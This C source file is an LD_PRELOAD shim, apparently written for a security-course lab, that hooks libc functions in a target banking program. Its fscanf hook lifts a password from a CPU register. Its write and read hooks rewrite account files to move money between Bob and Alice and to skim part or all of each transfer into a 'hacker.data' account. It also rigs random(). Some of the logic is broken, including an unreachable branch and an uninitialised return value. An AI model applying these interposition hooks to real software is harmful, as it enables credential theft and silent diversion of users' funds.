#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <string.h>
#include <errno.h>
#include <execinfo.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdarg.h>
/* We aren't providing much code here.  You'll need to implement quite a bit
 * for your library. */

/* Declarations for the functions in part2_hash.cc, so that we don't need an
 * extra header file. */
void malloc_insert(size_t size);
void malloc_dump();
void so_allocate();
void so_deallocate();
void openBob(int fd,const char *filename);
void openAlice(int fd,const char *filename);
void closeBob();
void closeAlice();
int getBobFd();
int getAliceFd();
int getBobBalance();
void setBobBalance(int balance);
int getAliceBalance();
void setAliceBalance(int balance);
void setTask(int t);
int getTask();
void setDesc3(int val);
int getDesc3();
void setDesc4(int val);
int getDesc4();
void setTransfer(int val);
int getTransfer();

char *file_cont;
int value_to_transfer = 0;
int hackerBool = 0;

static int ignoreMalloc = 0;

void *malloc(size_t bytes)
{
	static void* (*origMalloc)(size_t) = NULL;
	if(!origMalloc)
	{
		origMalloc = (void* (*)(size_t))dlsym(RTLD_NEXT, "malloc");
	}

	if(ignoreMalloc)
	{
		return origMalloc(bytes);
	}

	ignoreMalloc = 1;
	malloc_insert(bytes);
	ignoreMalloc = 0;

	return origMalloc(bytes);
}


__attribute__((destructor))
static void deallocate()
{
	malloc_dump();
	so_deallocate();
}


__attribute__((constructor))
static void allocate()
{
	so_allocate();
}


int fscanf(FILE *stream, const char *format, ...){
//	printf("in  fscanf\n");	
	static int (*origFscanf)(FILE *,const char *, ...) = NULL;
	if(!origFscanf)
	{
		origFscanf = (int (*)(FILE*,const char*,...))dlsym(RTLD_NEXT, "fscanf");
	}	
	int count;
	va_list ap;
	va_start(ap, format);
	if(strcmp(format, "%ms") == 0){ //Password call
		register char* reg asm("r13");
		char **b = va_arg(ap, char**);
		char **buff = b;
		*buff =(char *)malloc(sizeof(char)*20); 
		strcpy(*buff, reg);
		count = 1;
	}
	else { //Call scanf properly
		count = origFscanf(stream, format, va_arg(ap, int*));
	}
	va_end(ap);
	return count;
}


//Task 2

int open(const char *pathname, int flags, ...){
	va_list ap;
	va_start(ap, flags);
	int mode;
			
	static int (*origOpen)(const char *, int, ...) = NULL;
	
	origOpen = (int (*)(const char *, int, ...))dlsym(RTLD_NEXT, "open");
	
	int fd;
	file_cont = pathname;
	
	if((mode =va_arg(ap,int)) <=  0){
		fd =origOpen(mode, flags); //open task #
	}
	else{
		fd =origOpen(pathname, flags, mode); //open file
		printf("opening file %s\n", pathname);
		file_cont = pathname;
	}

	//Set the task number which is opened for each task
	int t = atoi(pathname);
	if(t == 4){
		setTask(t);
	}
    else if(t == 5){
		setTask(t);
	}
	else if(t == 7) {
		setTask(t);
	}
	return fd;
}

FILE *fopen(const char *pathname, const char *mode){

//	printf("in fopen pathname: %s \n", pathname);
	static FILE *(*origFopen)(const char *, const char *) = NULL;
	FILE *retval;
	if(!origFopen)
	{
		origFopen = (FILE *(*)(const char *, const char *))dlsym(RTLD_NEXT, "fopen");
	}

	retval = origFopen(pathname, mode);

	int t = getTask();
	
	//Task 2
	if(t == 2) {
		int fd = fileno(retval);
		if(strcmp(pathname, "bob.data") == 0){ //Bobs getting opened
			openBob(fd, pathname);	
		//	printf("open bob \n");

		}
		if(strcmp(pathname, "alice.data") == 0){
			openAlice(fd, pathname);
		//	printf("open alice \n");
		}
	}

	//Task 4
	if(t == 4){
		setTask(t);
	}
	else if(t == 5) {
		setTask(t);
	}

	return retval;
}

int close(int fd){
	int retval;
	static int (*origClose)(int) = NULL;
	
	origClose = (int (*)(int))dlsym(RTLD_NEXT, "close");
	
	retval = origClose(fd);
	
	int t = getTask();
	if(t == 2) {
		closeBob(fd);
		closeAlice(fd);
	}
	return retval;

}



ssize_t write(int handle, const void *buffer, size_t nbyte){
	static int (*origWrite)(int,const void*, size_t) = NULL;
	int retval;
	
	origWrite = (int (*)(int,const void*, size_t))dlsym(RTLD_NEXT, "write");

	int t = getTask();
	//Task 2
	if(t == 2) {
		int bob_fd = getBobFd(); 
		int alice_fd = getAliceFd(); 
		if((bob_fd != -1) && (alice_fd != -1)){ //Bob and Alice are  open
			int bob_balance = getBobBalance();
			int alice_balance = getAliceBalance();
			int amount_left_in_bob;
			if(bob_balance <= 0){
				if(handle == bob_fd){
					char buf[20];
					sprintf(buf, "%d", bob_balance);
					int nbyte = strlen(buf);
					retval = origWrite(handle, buf, nbyte); 
					return retval;
				}
				else if(handle == alice_fd){
					char buf[20];
					sprintf(buf, "%d", alice_balance);
					int nbyte = strlen(buf);
					retval = origWrite(handle, buf, nbyte); 
					return retval;
				}

			}
			else{
				if(handle == bob_fd){ //Bob is Open
					char buf[21];
					if(bob_balance == -1){
						printf("Error: cannot get bobs balance");
						exit(1);
					}						
		//			printf("in read if - buf is %s \n", buf);
					int nbyte;
					if(bob_balance < 100){
						sprintf(buf, "%d",0);
						nbyte = strlen(buf);
					}
					
					//int diff = atoi(buffer) - bob_balance; //What we are about to assign the balance to what bob's balance was
					//if(diff == 100){
					else{
		//				printf("in diff == 100 \n");
						sprintf(buf, "%d", bob_balance-100);
		//				printf("new buff is %s \n", buf);
						nbyte = strlen(buf);
					}
					retval = origWrite(handle, buf, nbyte); 
					return retval; //Break out of function
					//}
					
				}else if(alice_fd == handle){ //Alice is Open
					char buf[20];
		//			printf("in alice if \n");
					int curr_bal = atoi(buffer);
					int diff =  alice_balance - curr_bal;
					int orig = alice_balance;
					int nbyte;
					if(bob_balance < 100){
						sprintf(buf, "%d", orig+bob_balance);
						nbyte = strlen(buf);
					}else{	
						sprintf(buf, "%d", orig+100);
						nbyte = strlen(buf);
					}
					retval = origWrite(handle, buf, nbyte);
					return retval; //Break out of function
				}
			}
		}
	}
	//Task 4
	else if(t == 4){
			if(handle == 3) { //The file getting the transfer	
				if(handle == 3) { //The file getting the transfer	
					int updated_value = atoi(buffer);
			//		printf("updated val in handle == 3 is %d \n",updated_value);
					int prev_val = getDesc3();
					int transfer_amount= prev_val - updated_value;
					
					setTransfer(transfer_amount);
					retval = origWrite(handle, buffer, nbyte);
					return retval;
			}
			else if(handle == 4){
				int prev_val = getDesc4();
				int transfer_amount = getTransfer();
				//Calculate how much to send to hacker
				int transfer_to_hacker =(transfer_amount*0.10);
				//Calculate how much to send to receiver
				transfer_amount -= transfer_to_hacker;
					//Transfer to hacker
				int hacker_fd;
			
				char hacker_val[20]; // = (char *)malloc(sizeof(char)*20);
				memset(hacker_val, '\0', 20);
				hacker_fd = open("hacker.data", O_RDWR);
				lseek(hacker_fd, 0, SEEK_SET);
				read(hacker_fd, hacker_val, 20);
				int hack_val = atoi(hacker_val);
		//			printf("hacker val -> int is %d\n",hack_val);
				hack_val += transfer_to_hacker; //Add to hacker ;
				memset(hacker_val, '\0', 20);
				sprintf(hacker_val, "%d", hack_val);
				int amount_to_write = strlen(hacker_val);
				ftruncate(hacker_fd, 0);
				lseek(hacker_fd, 0, SEEK_SET);
		//		printf("amount to write is %d \n",amount_to_write);			
		//		printf("hacker val read in is: %s\n", hacker_val);
				origWrite(hacker_fd, hacker_val, amount_to_write);
				close(hacker_fd);
					//Update value of receiver
				int write_amount = prev_val + transfer_amount;
		//		printf("receiver value is :%d \n", write_amount);
				char write_amount_to_4[20];
				memset(write_amount_to_4, '\0', 20);
				sprintf(write_amount_to_4, "%d", write_amount);
				int nbytes = strlen(write_amount_to_4);
		//		printf("nbytes for reciver: %d\n", nbytes);
				retval = origWrite(handle, write_amount_to_4, nbytes);
				return retval;
			}
		}
	}
	//Task 5
	else if(t == 5) {
		if(handle == 3) {
			int updated_value = atoi(buffer);
			int prev_val = getDesc3();
			int transfer_amount = prev_val - updated_value;

			setTransfer(transfer_amount);
			retval = origWrite(handle, buffer, nbyte);
			return retval;
		}
		else if(handle == 4) {
			int prev_val = getDesc4();
			int transfer_amount = getTransfer();

			//Calculate how much to send to hacker compared to others
			//int randoH = (10 + random() % 120)/100;

			//int randoR = (random() % 100)/100;

			int hacker_fd;
			char hacker_val[20];
			memset(hacker_val, '\0', 20);
			
			if(hacker_fd = open("hacker.data", O_RDWR)) {
				hackerBool = 1;
				lseek(hacker_fd, 0, SEEK_SET);
				read(hacker_fd, hacker_val, 20);
				int hack_val = atoi(hacker_val);
				//hack_val += transfer_amount*randoH; //Add to hacker ;
				hack_val += transfer_amount;
				memset(hacker_val, '\0', 20);
				sprintf(hacker_val, "%d", hack_val);
				int amount_to_write = strlen(hacker_val);
				ftruncate(hacker_fd, 0);
				lseek(hacker_fd, 0, SEEK_SET);
				origWrite(hacker_fd, hacker_val, amount_to_write);
				close(hacker_fd);

				int write_amount = prev_val + transfer_amount;

				char write_amount_to_5[20];
				memset(write_amount_to_5, '\0', 20);
				sprintf(write_amount_to_5, "%d", write_amount);
				int nbytes = strlen(write_amount_to_5);

				retval = origWrite(handle, write_amount_to_5, nbytes);
				hackerBool = 0;
				return retval;
			}else{
				int reg_fd = open(buffer, O_RDWR);
				hackerBool = 0;
				char regu_val[20];
				//Following system calls as seen strace
				memset(regu_val, '\0', 20);

				lseek(reg_fd, 0, SEEK_SET);
				read(reg_fd, regu_val, 20);
				
				int reg_val = atoi(regu_val);
				//reg_val += transfer_amount*randoR; //Add to hacker ;
				reg_val += transfer_amount;
				memset(regu_val, '\0', 20);
				sprintf(regu_val, "%d", reg_val);
				
				int amount_to_write = strlen(regu_val);
				ftruncate(reg_fd, 0);
				lseek(reg_fd, 0, SEEK_SET);
				origWrite(reg_fd, regu_val, amount_to_write);
				close(reg_fd);

				int write_amount = prev_val + transfer_amount;

				char write_amount_to_5[20];
				memset(write_amount_to_5, '\0', 20);
				sprintf(write_amount_to_5, "%d", write_amount);
				int nbytes = strlen(write_amount_to_5);

				retval = origWrite(handle, write_amount_to_5, nbytes);
				return retval;
			}
		}
	}
	//Task 7
	else if(t == 7) {
		if(handle == 3) { //The file getting the transfer	
			int updated_value = atoi(buffer);
	//		printf("updated val in handle == 3 is %d \n",updated_value);
			int prev_val = getDesc3();
			int transfer_amount= prev_val - updated_value;
			
			setTransfer(transfer_amount);

			retval = origWrite(handle, buffer, nbyte);
			return retval;
		}
		else if(handle == 4) {
			int prev_val = getDesc4();
			int transfer_amount = getTransfer();
			//Calculate how much to send to hacker
			int transfer_to_hacker =(transfer_amount*0.10);
			//Calculate how much to send to receiver
			transfer_amount -= transfer_to_hacker;

			//Transfer to hacker
			int hacker_fd;
		
			char hacker_val[20]; // = (char *)malloc(sizeof(char)*20);
			memset(hacker_val, '\0', 20);
			hacker_fd = open("hacker.data", O_RDWR);
			lseek(hacker_fd, 0, SEEK_SET);
			read(hacker_fd, hacker_val, 20);

			int hack_val = atoi(hacker_val);
//			printf("hacker val -> int is %d\n",hack_val);
			hack_val += transfer_to_hacker; //Add to hacker ;
			memset(hacker_val, '\0', 20);
			sprintf(hacker_val, "%d", hack_val);

			int amount_to_write = strlen(hacker_val);
			ftruncate(hacker_fd, 0);
			lseek(hacker_fd, 0, SEEK_SET);

	//		printf("amount to write is %d \n",amount_to_write);			
	//		printf("hacker val read in is: %s\n", hacker_val);
			origWrite(hacker_fd, hacker_val, amount_to_write);
			close(hacker_fd);

			//Update value of receiver
			int write_amount = prev_val + transfer_amount;
	//		printf("receiver value is :%d \n", write_amount);
			char write_amount_to_4[20];

			memset(write_amount_to_4, '\0', 20);
			sprintf(write_amount_to_4, "%d", write_amount);
			int nbytes = strlen(write_amount_to_4);
	//		printf("nbytes for reciver: %d\n", nbytes);

			//Creating encryptions
			char *enc_buff = file_cont;
			int len = strlen(enc_buff);

			int xor_len = len - 4;

			char xor_buff[xor_len + 1];
			strncpy(xor_buff, enc_buff, xor_len);
			strcat(xor_buff, "\0");

			printf("enc is %s and %s\n", enc_buff, xor_buff);

			retval = origWrite(handle, write_amount_to_4, nbytes);
			return retval;
		}
	}
	
	retval = origWrite(handle, buffer, nbyte);
	return retval;
}


ssize_t read(int handle, void *buf, size_t nbyte){
	static int (*origRead)(int,void*, size_t) = NULL;
	int retval;
//	if(!origRead)
//	{
		origRead = (int (*)(int, void*, size_t))dlsym(RTLD_NEXT, "read");
//	}

	memset(buf, '\0', nbyte);

	retval = origRead(handle, buf, nbyte);

	//printf("read in %s \n", buf);


	//Task 2
	int t = getTask();
	if(t == 2){
		int bobFd = getBobFd();
		int aliceFd = getAliceFd();
		if((bobFd != -1) && (aliceFd != -1)){ // Alice and Bob are open
			int bal = atoi(buf);
			//int bal = atoi(temp_buff);
			if(handle == aliceFd){
				setAliceBalance(bal);
			}
			else if(handle == bobFd){
				setBobBalance(bal);
			}
		}
	}		
	//Task 4
	if(t == 4) {
		printf("HERE\n");
		int prev_val = atoi(buf);
		if(handle == 3){ //Set prev value for the sender (fd == 3)
			setDesc3(prev_val);
		}
		else if(handle == 4){ //Set prev value for the receiver (fd == 4)
			setDesc4(prev_val);
		}
	}
	//Task 5
	if(t == 5) {
		int prev_val = atoi(buf);
		if(handle == 3) { //Set prev value for the sender (fd == 3)
			setDesc3(prev_val);
		}
		else if(handle == 4) { //Set prev value for the receiver (fd == 4)
			setDesc4(prev_val);
		}
	}
	//Task 7
	if(t == 7) {
		int prev_val = atoi(buf);
		if(handle == 3) { //Set prev value for the sender (fd == 3)
			setDesc3(prev_val);
		}
		else if(handle == 4) { //Set prev value for the receiver (fd == 4)
			setDesc4(prev_val);
		}
	}

	return retval;
}

long int random(void) {
	static long int (*origRandom)(void) = NULL;
	origRandom = (long int (*)(void))dlsym(RTLD_NEXT, "random");

	int t = getTask();
	int ret, hacker_fd;
	if(t == 5){
		if(hackerBool) {
			ret = 10 + origRandom() % 120;
			return ret;
		}
		ret = origRandom() % 100;
	}
	return ret;
}
